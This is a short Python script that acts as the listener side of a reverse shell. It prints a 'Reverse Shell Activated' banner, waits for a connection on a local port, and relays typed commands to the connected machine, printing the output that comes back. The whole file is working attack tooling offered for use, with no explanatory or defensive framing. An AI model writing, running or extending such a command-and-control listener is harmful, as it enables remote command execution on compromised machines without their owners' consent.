# Importing modules required
from socket import socket
import sys, getopt
import pyfiglet
import os


os.system("clear")
# Creating and printing out banner
ascii_banner = pyfiglet.figlet_format("Reverse Shell \n Activated")
print(ascii_banner)

# Create a connection socket
def connect():
    s = socket()
    s.bind(('127.0.0.1', 8888))
    s.listen(1)
    print("[*] Waiting for connection !")
    conn, addr = s.accept()
    print(f"[+] Connected to {addr}")

    while True:
        command = input("Shell=> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            print("[*] Connection Terminated !")
            break
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())
def main():
    connect()
main()
